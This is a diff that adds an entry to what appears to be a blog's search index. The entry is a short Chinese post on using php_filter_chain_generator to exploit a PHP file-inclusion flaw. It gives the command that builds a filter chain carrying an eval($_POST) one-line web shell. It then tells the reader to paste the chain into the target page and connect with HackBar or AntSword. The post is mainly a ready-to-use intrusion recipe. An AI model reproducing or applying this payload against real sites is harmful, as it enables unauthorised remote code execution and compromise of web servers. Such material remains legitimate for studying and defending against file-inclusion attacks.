@@ -246,4 +246,18 @@
         <tag>PHP</tag>
       </tags>
   </entry>
+  <entry>
+    <title>php_filter_chain_generator</title>
+    <url>/2024/07/14/php-filter-chain-generator/</url>
+    <content><![CDATA[<p>&emsp;&emsp;该工具是利用文件包含漏洞伪协议，在流中写入一句话木马，脚本下载<a href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用使用方法（当然也可以去那里看）</p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">python3 php_filter_chain_generator.py --chain &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;复制显示出来的链子放入网页中，用hackbar或者蚁剑连接即可<br>！<a href="/images/php_filter2.png">php_filter2</a></p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+      </tags>
+  </entry>
 </search>
